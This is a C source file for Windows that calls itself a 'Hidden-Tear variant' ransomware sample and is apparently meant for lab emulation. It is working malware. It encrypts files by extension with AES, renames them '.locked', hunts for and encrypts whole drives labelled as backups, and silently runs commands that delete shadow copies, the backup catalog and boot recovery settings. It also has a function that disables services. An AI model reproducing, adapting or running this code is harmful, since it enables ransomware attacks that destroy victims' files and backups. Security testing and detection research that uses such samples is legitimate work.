// A01_3 Hidden-Tear variant with local file encryption and recovery inhibition
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <windows.h>
#include <wincrypt.h>
#include <shlwapi.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

// Structure representing the A01_3 sample
typedef struct
{
    char user_name[MAX_PATH];
    char user_dir[MAX_PATH];
} A01_3_Sample;

// Function prototypes
void sample_init(A01_3_Sample *self);
void sample_run(A01_3_Sample *self);
void InhibitRecoveryCmds(void);
BOOL DisableService(const char *serviceName);
const char *EnumBackupVolume(void);
BOOL InspectVolume(const char *driveLetter);

unsigned char *aes_encrypt(
    const unsigned char *plaintext,
    size_t plaintext_len,
    const char *key,
    size_t *out_len);

char *generate_key(int length);

void encrypt_file(
    const char *file,
    const char *key);

void encrypt_directory(
    const char *location,
    const char *key);

void start_action(A01_3_Sample *self);

// Converts a string to lowercase
void to_lower_string(char *str)
{
    for (; *str; ++str)
    {
        *str = (char)tolower((unsigned char)*str);
    }
}

// Initializes the sample structure
void sample_init(A01_3_Sample *self)
{
    char *env_user = getenv("USERNAME");

    if (env_user != NULL)
    {
        strncpy(self->user_name, env_user, MAX_PATH - 1);
        self->user_name[MAX_PATH - 1] = '\0';
    }
    else
    {
        strcpy(self->user_name, "DefaultUser");
    }

    strcpy(self->user_dir, "C:\\Users\\");
}

// Starts sample execution
void sample_run(A01_3_Sample *self)
{
    start_action(self);
}

void InhibitRecoveryCmds(void)
{
    // Array of standard administrative commands used to strip local recovery points
    const char *commands[] = {
        "vssadmin.exe delete shadows /all /quiet",
        "bcdedit.exe /set {default} recoveryenabled No",
        "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
        "wbadmin.exe delete catalog -quiet",
        "wmic.exe shadowcopy delete"};

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    size_t command_count =
        sizeof(commands) / sizeof(commands[0]);

    for (size_t i = 0; i < command_count; i++)
    {
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        // Create process hidden without displaying console windows
        char cmdLine[512];
        snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", commands[i]);

        if (CreateProcessA(
                NULL,             // Application Name
                cmdLine,          // Command Line Arguments
                NULL,             // Process Attributes
                NULL,             // Thread Attributes
                FALSE,            // Inherit Handles
                CREATE_NO_WINDOW, // Creation Flags (Hides Window)
                NULL,             // Environment
                NULL,             // Current Directory
                &si,              // Startup Info
                &pi               // Process Information
                ))
        {
            // Wait for execution to finish and close handles
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

BOOL DisableService(const char *serviceName)
{
    SC_HANDLE hSCManager =
        OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);

    if (hSCManager == NULL)
    {
        return FALSE;
    }

    SC_HANDLE hService = OpenServiceA(
        hSCManager,
        serviceName,
        SERVICE_STOP | SERVICE_CHANGE_CONFIG |
            SERVICE_QUERY_STATUS);

    if (hService == NULL)
    {
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    SERVICE_STATUS status;
    ZeroMemory(&status, sizeof(status));

    BOOL stop_result =
        ControlService(
            hService,
            SERVICE_CONTROL_STOP,
            &status);

    BOOL config_result =
        ChangeServiceConfigA(
            hService,
            SERVICE_NO_CHANGE,
            SERVICE_DISABLED,
            SERVICE_NO_CHANGE,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    /*
     * A service that was already stopped can cause the stop
     * request to fail even though the configuration change worked.
     */
    return config_result;
}

// Encrypts a byte buffer using AES-256 through Windows CryptoAPI
unsigned char *aes_encrypt(
    const unsigned char *plaintext,
    size_t plaintext_len,
    const char *key,
    size_t *out_len)
{
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;

    unsigned char *encrypted = NULL;

    if (out_len == NULL)
    {
        return NULL;
    }

    *out_len = 0;

    if (!CryptAcquireContextA(
            &hProv,
            NULL,
            NULL,
            PROV_RSA_AES,
            CRYPT_VERIFYCONTEXT))
    {
        return NULL;
    }

    if (!CryptCreateHash(
            hProv,
            CALG_SHA_256,
            0,
            0,
            &hHash))
    {
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    if (!CryptHashData(
            hHash,
            (const BYTE *)key,
            (DWORD)strlen(key),
            0))
    {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    if (!CryptDeriveKey(
            hProv,
            CALG_AES_256,
            hHash,
            0,
            &hKey))
    {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    DWORD data_len = (DWORD)plaintext_len;
    DWORD buffer_len = data_len + 16;

    encrypted = (unsigned char *)malloc(buffer_len);

    if (encrypted == NULL)
    {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    memcpy(encrypted, plaintext, plaintext_len);

    if (!CryptEncrypt(
            hKey,
            0,
            TRUE,
            0,
            (BYTE *)encrypted,
            &data_len,
            buffer_len))
    {
        free(encrypted);
        encrypted = NULL;
        *out_len = 0;
    }
    else
    {
        *out_len = (size_t)data_len;
    }

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return encrypted;
}

// Generates a random encryption-key string
char *generate_key(int length)
{
    const char *valid =
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "1234567890"
        "*!=&?&/";

    size_t valid_len = strlen(valid);

    char *result = (char *)malloc((size_t)length + 1);

    if (result == NULL)
    {
        return NULL;
    }

    for (int i = 0; i < length; i++)
    {
        result[i] = valid[rand() % valid_len];
    }

    result[length] = '\0';

    return result;
}

// Encrypts a single file
void encrypt_file(
    const char *file,
    const char *key)
{
    const char *extension = PathFindExtensionA(file);

    char ext_lower[MAX_PATH];

    strncpy(ext_lower, extension, MAX_PATH - 1);
    ext_lower[MAX_PATH - 1] = '\0';

    to_lower_string(ext_lower);

    // Prevent already-encrypted files from being processed again
    if (strcmp(ext_lower, ".locked") == 0)
    {
        return;
    }

    FILE *input = fopen(file, "rb");

    if (input == NULL)
    {
        return;
    }

    if (fseek(input, 0, SEEK_END) != 0)
    {
        fclose(input);
        return;
    }

    long file_size = ftell(input);

    if (file_size < 0)
    {
        fclose(input);
        return;
    }

    if (fseek(input, 0, SEEK_SET) != 0)
    {
        fclose(input);
        return;
    }

    unsigned char *bytes_to_be_encrypted =
        (unsigned char *)malloc((size_t)file_size);

    if (bytes_to_be_encrypted == NULL && file_size > 0)
    {
        fclose(input);
        return;
    }

    size_t bytes_read = fread(
        bytes_to_be_encrypted,
        1,
        (size_t)file_size,
        input);

    fclose(input);

    if (bytes_read != (size_t)file_size)
    {
        free(bytes_to_be_encrypted);
        return;
    }

    size_t encrypted_len = 0;

    unsigned char *bytes_encrypted = aes_encrypt(
        bytes_to_be_encrypted,
        (size_t)file_size,
        key,
        &encrypted_len);

    free(bytes_to_be_encrypted);

    if (bytes_encrypted == NULL)
    {
        return;
    }
    printf(
        "Encrypting: %s\n"
        "Plaintext size : %ld\n"
        "Ciphertext size: %zu\n"
        "Ciphertext mod16: %zu\n\n",
        file,
        file_size,
        encrypted_len,
        encrypted_len % 16);

    FILE *output = fopen(file, "wb");

    if (output == NULL)
    {
        free(bytes_encrypted);
        return;
    }

    size_t bytes_written = fwrite(
        bytes_encrypted,
        1,
        encrypted_len,
        output);

    printf(
        "Requested write: %zu bytes\n"
        "Actual write: %zu bytes\n",
        encrypted_len,
        bytes_written);

    fclose(output);
    free(bytes_encrypted);

    if (bytes_written != encrypted_len)
    {
        return;
    }

    char new_name[MAX_PATH];

    int result = snprintf(
        new_name,
        MAX_PATH,
        "%s.locked",
        file);

    if (result < 0 || result >= MAX_PATH)
    {
        return;
    }

    rename(file, new_name);
}

// Encrypts matching files in a directory and its subdirectories
void encrypt_directory(
    const char *location,
    const char *key)
{
    const char *valid_extensions[] = {
        ".txt",
        ".doc",
        ".docx",
        ".xls",
        ".xlsx",
        ".ppt",
        ".pptx",
        ".odt",
        ".jpg",
        ".png",
        ".csv",
        ".sql",
        ".mdb",
        ".sln",
        ".php",
        ".asp",
        ".aspx",
        ".html",
        ".xml",
        ".psd"};

    int num_extensions =
        (int)(sizeof(valid_extensions) /
              sizeof(valid_extensions[0]));

    char search_path[MAX_PATH];

    int search_result = snprintf(
        search_path,
        MAX_PATH,
        "%s\\*",
        location);

    if (search_result < 0 || search_result >= MAX_PATH)
    {
        return;
    }

    WIN32_FIND_DATAA find_data;

    HANDLE hFind = FindFirstFileA(
        search_path,
        &find_data);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        return;
    }

    do
    {
        if (strcmp(find_data.cFileName, ".") == 0 ||
            strcmp(find_data.cFileName, "..") == 0)
        {
            continue;
        }

        char full_path[MAX_PATH];

        int path_result = snprintf(
            full_path,
            MAX_PATH,
            "%s\\%s",
            location,
            find_data.cFileName);

        if (path_result < 0 || path_result >= MAX_PATH)
        {
            continue;
        }

        if (!(find_data.dwFileAttributes &
              FILE_ATTRIBUTE_DIRECTORY))
        {
            const char *extension =
                PathFindExtensionA(full_path);

            char ext_lower[MAX_PATH];

            strncpy(
                ext_lower,
                extension,
                MAX_PATH - 1);

            ext_lower[MAX_PATH - 1] = '\0';

            to_lower_string(ext_lower);

            int is_valid = 0;

            for (int i = 0; i < num_extensions; i++)
            {
                if (strcmp(
                        ext_lower,
                        valid_extensions[i]) == 0)
                {
                    is_valid = 1;
                    break;
                }
            }

            if (is_valid)
            {
                encrypt_file(full_path, key);
            }
        }
        else
        {
            encrypt_directory(full_path, key);
        }

    } while (FindNextFileA(hFind, &find_data));

    FindClose(hFind);
}

const char *EnumBackupVolume(void)
{
    static char backupDrive[MAX_PATH] = {0};

    char driveBuffer[256] = {0};

    DWORD bytesReturned =
        GetLogicalDriveStringsA(
            sizeof(driveBuffer) - 1,
            driveBuffer);

    if (bytesReturned == 0)
    {
        return NULL;
    }

    char *driveLetter = driveBuffer;

    while (*driveLetter)
    {
        UINT driveType = GetDriveTypeA(driveLetter);

        if (driveType == DRIVE_FIXED ||
            driveType == DRIVE_REMOTE)
        {
            if (InspectVolume(driveLetter))
            {
                strcpy(backupDrive, driveLetter);
                return backupDrive;
            }
        }

        driveLetter += strlen(driveLetter) + 1;
    }

    return NULL;
}

BOOL InspectVolume(const char *driveLetter)
{
    char volumeName[MAX_PATH] = {0};
    char fileSystemName[MAX_PATH] = {0};
    DWORD serialNumber = 0;
    DWORD maxComponentLength = 0;
    DWORD flags = 0;

    if (GetVolumeInformationA(
            driveLetter,
            volumeName, sizeof(volumeName),
            &serialNumber,
            &maxComponentLength,
            &flags,
            fileSystemName, sizeof(fileSystemName)))
    {
        printf("Drive: %s | Label: '%s' | File System: %s\n",
               driveLetter, volumeName, fileSystemName);

        // Check if the label suggests a backup target
        if (strstr(volumeName, "Backup") != NULL || strstr(volumeName, "BACKUP") != NULL)
        {
            return TRUE; // Found potential backup target
        }
    }
    return FALSE;
}

// Starts the controlled encryption process
void start_action(A01_3_Sample *self)
{
    char *key = generate_key(15);

    if (key == NULL)
    {
        return;
    }

    const char *key_path =
        "C:\\Users\\Public\\A01_3_Lab_Encryption_Key.txt";

    FILE *key_file = fopen(key_path, "w");

    if (key_file != NULL)
    {
        fprintf(key_file, "%s", key);
        fclose(key_file);
    }

    /*
     * Recovery discovery occurs before encryption.
     */
    const char *backupDrive = EnumBackupVolume();

    if (backupDrive != NULL)
    {

        if (PathFileExistsA(backupDrive) && PathIsDirectoryA(backupDrive))
        {
            encrypt_directory(backupDrive, key);
        }

        InhibitRecoveryCmds();
    }
    else
    {
        printf("No backup volume found.\n");
    }

    const char *start_path =
        "C:\\Users\\Public\\A01_TestData";

    if (PathFileExistsA(start_path) &&
        PathIsDirectoryA(start_path))
    {
        encrypt_directory(start_path, key);
    }

    SecureZeroMemory(key, strlen(key));
    free(key);
}

// Program entry logic
void program_main(void)
{
    A01_3_Sample sample;

    sample_init(&sample);
    sample_run(&sample);
}

int main(void)
{
    srand((unsigned int)GetTickCount());

    program_main();

    return 0;
}
